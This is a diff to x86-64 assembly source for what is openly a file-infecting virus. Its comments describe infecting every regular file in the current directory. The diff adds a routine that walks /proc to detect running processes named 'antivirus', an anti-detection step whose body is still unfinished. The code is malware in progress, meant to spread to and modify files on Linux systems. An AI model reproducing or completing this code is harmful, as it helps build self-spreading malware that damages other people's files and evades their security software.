@@ -3,19 +3,24 @@
 ;|     (° u °)     ** |
 ;|    /--------\   /  |
 ;| o--|531-m31c|--/	  |
-;|    \--------/ 	  |
-;|      N    N		  |
+;|    \--------/      |
+;|      N    N        |
 ;|____________________|
 
 
 global _start
 
 _start:
+	;First we wanna check that no program containning "antivirus" in it's name is running"
+	mov rax, 0x00636f72702f; /proc
+	push rax
+	call check_process
+	add rsp, 8
+	;infect current directory
 	push 0x0000002e; our target directory here "."
 	lea rdi, [rsp]
 	call list_files
-	sub rsp, 8
-
+	add rsp, 8
 exit_prog:
 	mov	rax, 0x3c;
 	mov rdi, 1
@@ -137,7 +142,53 @@ debugn:
 	pop rbx
 retn
 
+%define REGULAR_FILE 8
+%define DIRECTORY_FILE 4
 
+check_process:
+	sub rsp, 1024;this is gonna be our buffer
+	sub rsp, 4; fd
+	mov rsi, 65536; O_RDONLY | O_DIRECTORY
+	xor rdx, rdx
+	mov rax, 2; sycall open
+	syscall
+	cmp rax, -1
+	je exit_prog ;open error
+ 	mov [rsp], rax
+	cp_dir_read_loop:
+		mov rdi, [rsp];fd of dir
+		lea rsi, [rsp + 4]; addr of buffer
+		mov rdx, 1024;reading max 1024 bytes
+		mov rax, 217;getdents64 syscall
+		syscall
+		cmp rax, -1
+		je exit_prog;getdents64 err
+		cmp rax, 0
+		je cp_dir_read_exit; done reading dir
+		mov r10, rax; store number bytes read
+		xor rcx, rcx; will serve as index to parse files
+		cp_parse_file_loop:
+			mov r8, rsi; save rsi
+			lea r9, [rsi + rcx] ; current linux_dirent64*
+			lea rsi, [r9 + 19];filename
+			cmp byte[r9 + 18], DIRECTORY_FILE; [r9 +18] is file type
+			jne cp_skip_file
+			mov rdi, rsi; pass fname as arg
+			;do stuff here
+			cp_skip_file: 
+			mov rsi, r8
+			xor rdx, rdx
+			mov dx, WORD[r9 + 16] ;len of current linux_dirent64*
+			add rcx, rdx
+			cmp rcx, r10
+			jae cp_parse_file_exit
+			jmp cp_parse_file_loop
+		cp_parse_file_exit: 
+		jmp cp_dir_read_loop
+	cp_dir_read_exit:
+	add rsp, 4
+	add rsp,1024
+retn
 
 ft_strlen:
 	xor rax, rax
@@ -149,8 +200,7 @@ ft_strlen:
 	strlen_exit:
 retn
 
-%define REGULAR_FILE 8
-%define DIRECTORY_FILE 4
+
 ;list all files in a folder and calls falmine_file to infect it if it's a regular file
 list_files:
 	sub rsp, 1024;this is gonna be our buffer
